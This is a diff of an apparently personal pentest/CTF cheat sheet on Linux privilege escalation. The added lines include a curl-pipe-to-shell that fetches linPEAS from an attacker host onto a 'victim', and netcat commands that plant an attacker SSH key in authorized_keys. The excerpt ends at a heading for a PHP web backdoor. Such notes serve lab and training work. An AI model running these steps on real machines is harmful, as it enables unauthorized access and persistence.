@@ -194,10 +194,9 @@ cat /etc/crontab
 - if there are SUID ou GUID look [gtfobins.io](https://gtfobins.github.io/)
 - for tansfer script or folder with server/attacker machine :
 ```bash
-nc -q 0 <adress IP of owner folder> 1234 > script.sh
-#netcat for the machine who want the script
-scp script.sh <user>@<IP address>:/example/script.sh 
-#use scp to download script on other machine
+# Local network
+sudo python3 -m http.server 80 #Host
+curl 10.10.10.10/linpeas.sh | sh #Victim
 
 #Don't forget to give permission to execute script
 chmod +x script.sh
@@ -214,8 +213,8 @@ chmod +x script.sh
 ssh-keygen -t rsa -b 4096
 chmod 600 id_rsa
 #now transfer id_rsa.pub via netcat or whatever you want in home/target/.ssh and rename file in authorized_key
-nc <target ip> -lvnp <port> > id_rsa.pub #execute on attacker machine
-nc <attacker ip> <port> < authorized_key #execute on target machine
+nc <target ip> -lvnp <port> < id_rsa.pub #host
+nc <attacker ip> <port> < authorized_key #target
 ```
 - Php backdoor copy this in some file in /var/www/html and change cmd because its a common request 
 ```php
